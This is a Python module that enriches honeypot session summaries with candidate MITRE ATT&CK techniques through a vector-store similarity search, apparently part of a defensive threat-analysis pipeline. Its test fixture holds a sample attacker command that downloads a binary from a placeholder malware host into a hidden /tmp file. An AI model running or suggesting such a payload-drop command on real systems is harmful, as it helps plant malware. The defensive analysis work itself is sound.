# ai/rag/query.py

import os
from pathlib import Path

import chromadb
from chromadb.utils.embedding_functions import OpenAIEmbeddingFunction
from load_dotenv import load_dotenv

load_dotenv()

def get_collection(chroma_path="./data/chroma/mitre"):
    """
    Open the MITRE attack_patterns collection with the same embedding config
    used during ingestion.
    """
    chroma_path = Path(chroma_path)

    api_key = os.getenv("OPENAI_API_KEY")
    if not api_key:
        raise RuntimeError("OPENAI_API_KEY environment variable is not set")

    client = chromadb.PersistentClient(path=str(chroma_path))

    embed_fn = OpenAIEmbeddingFunction(
        api_key=api_key,
        model_name="text-embedding-3-small",
    )

    collection = client.get_or_create_collection(
        name="mitre_attack_patterns",
        embedding_function=embed_fn,
    )
    return collection


def build_query_text(session_summary: dict) -> str:
    """
    Build a safe similarity-search query string for MITRE lookup.
    Prevents embedding overflow by truncating long fields.
    """

    MAX_SUMMARY_CHARS = 1500
    MAX_COMMANDS = 10
    MAX_URLS = 10
    MAX_SIGNATURES = 10

    parts = []

    # Summary (truncate)
    summary = session_summary.get("summary", "")
    if summary:
        parts.append(summary[:MAX_SUMMARY_CHARS])

    # Attack intent
    intent = session_summary.get("attack_intent")
    if intent:
        parts.append(f"Attack intent: {intent}")

    indicators = session_summary.get("key_indicators", {})

    # IPs
    src_ip = indicators.get("src_ip")
    if src_ip:
        parts.append(f"Source IP: {src_ip}")

    dest_ip = indicators.get("dest_ip")
    if dest_ip:
        parts.append(f"Destination IP: {dest_ip}")

    # Ports
    src_ports = indicators.get("src_ports", [])
    dest_ports = indicators.get("dest_ports", [])
    if src_ports:
        parts.append("Source ports: " + ", ".join(map(str, src_ports)))
    if dest_ports:
        parts.append("Destination ports: " + ", ".join(map(str, dest_ports)))

    # Protocols
    protocols = indicators.get("protocols", [])
    if protocols:
        parts.append("Protocols: " + ", ".join(protocols))

    # Commands – truncated
    for cmd in indicators.get("commands", [])[:MAX_COMMANDS]:
        parts.append(f"Command: {cmd}")

    # URLs – truncated
    for url in indicators.get("urls", [])[:MAX_URLS]:
        parts.append(f"URL: {url}")

    # Suricata signatures – truncated
    for sig in indicators.get("signatures", [])[:MAX_SIGNATURES]:
        parts.append(f"Signature: {sig}")

    # Files
    for f in indicators.get("files", []):
        parts.append(f"File: {f}")

    # Timestamp range
    ts = session_summary.get("timestamp_range", {})
    start_ts = ts.get("start")
    end_ts = ts.get("end")
    if start_ts or end_ts:
        parts.append(f"Time range: {start_ts} → {end_ts}")

    if not parts:
        return "Empty session summary"

    return "\n".join(parts)




def query_mitre_for_session(session_summary, top_k=5, chroma_path="./data/chroma/mitre"):
    """
    Query MITRE ATT&CK patterns for a single session summary.
    Returns a list of candidate techniques with metadata and distance score.
    """
    collection = get_collection(chroma_path=chroma_path)
    query_text = build_query_text(session_summary)

    result = collection.query(
        query_texts=[query_text],
        n_results=top_k,
    )

    ids_list = result.get("ids", [[]])[0]
    metadatas_list = result.get("metadatas", [[]])[0]
    distances_list = result.get("distances", [[]])[0]

    matches = []

    index = 0
    while index < len(ids_list):
        meta = metadatas_list[index] or {}
        distance = None
        if index < len(distances_list):
            distance = distances_list[index]

        match = {
            "tid": meta.get("tid"),
            "name": meta.get("name"),
            "tactics": meta.get("tactics"),
            "platforms": meta.get("platforms"),
            "domain": meta.get("domain"),
            "is_subtechnique": meta.get("is_subtechnique"),
            "mitre_url": meta.get("mitre_url"),
            "distance": distance,
        }
        matches.append(match)

        index = index + 1

    return matches


def enrich_session_with_mitre(session_summary, top_k=5, chroma_path="./data/chroma/mitre"):
    """
    Add MITRE candidate techniques to a Layer 1 session summary.
    """
    mitre_candidates = query_mitre_for_session(
        session_summary,
        top_k=top_k,
        chroma_path=chroma_path,
    )
    session_summary["mitre_candidates"] = mitre_candidates
    return session_summary


if __name__ == "__main__":
    # Simple manual test with a fake session summary.
    example_summary = {
        "session_id": "test_session",
        "sensor": "Cowrie",
        "attack_intent": "malware_drop_attempt",
        "summary": "Attacker logged in via SSH and downloaded a suspicious binary from a URL.",
        "key_indicators": {
            "src_ip": "10.40.40.10",
            "commands": ["wget http://malware.example.fake/mips -O /tmp/.m || true"],
            "urls": ["http://malware.example.fake/mips"],
            "files": ["/tmp/.m"],
        },
    }

    enriched = enrich_session_with_mitre(example_summary)
    print("MITRE candidates:")
    for c in enriched.get("mitre_candidates", []):
        print(c)
